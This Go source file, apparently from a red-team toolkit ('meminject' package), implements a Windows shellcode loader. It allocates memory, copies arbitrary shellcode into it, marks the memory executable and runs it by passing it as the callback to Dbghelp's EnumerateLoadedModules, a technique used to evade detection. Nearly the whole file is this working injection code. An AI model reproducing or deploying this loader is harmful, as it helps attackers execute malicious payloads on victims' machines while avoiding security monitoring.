// This technique is semi-unreliable because the shellcode is sometimes executed multiple times

package meminject

import (
	// Standard

	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func Enumerateloadedmodules(debug bool, verbose bool, shellcode []byte) {

	if debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc with PAGE_READWRITE...")
	}
	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
	}

	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	if verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
	}
	var oldProtect uint32
	errVirtualProtect := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if errVirtualProtect != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if debug {
		fmt.Println("[DEBUG]Calling GetCurrentProcess...")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32")
	GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
	// HANDLE GetCurrentProcess();
	// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
	handle, _, err := GetCurrentProcess.Call()
	if err != syscall.Errno(0) {
		log.Fatal(fmt.Sprintf("[!]Error calling GetCurrentProcess:\r\n%s", err))
	}

	if debug {
		fmt.Println("[DEBUG]Calling EnumerateLoadedModules...")
	}

	dbghelp := windows.NewLazySystemDLL("Dbghelp")
	enumerateLoadedModules := dbghelp.NewProc("EnumerateLoadedModules")
	// BOOL IMAGEAPI EnumerateLoadedModules(
	//   HANDLE                       hProcess,
	//   PENUMLOADED_MODULES_CALLBACK EnumLoadedModulesCallback,
	//   PVOID                        UserContext
	// );
	// https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-enumerateloadedmodules
	_, _, err = enumerateLoadedModules.Call(handle, addr, 0)
	if err != syscall.Errno(0) {
		log.Fatal(fmt.Sprintf("[!]Error calling EnumerateLoadedModules:\r\n%s", err))
	}

	if verbose {
		fmt.Println("[+]Shellcode executed")
	}
}

// BOOL PenumloadedModulesCallback(
//   PCSTR ModuleName,
//   ULONG ModuleBase,
//   ULONG ModuleSize,
//   PVOID UserContext
// )

type PENUMLOADED_MODULES_CALLBACK struct {
	ModuleName  uintptr // The name of the enumerated module
	ModuleBase  uintptr // The base address of the module
	ModuleSize  uintptr // The size of the module, in bytes
	UserContext uintptr // Optional user-defined data
}
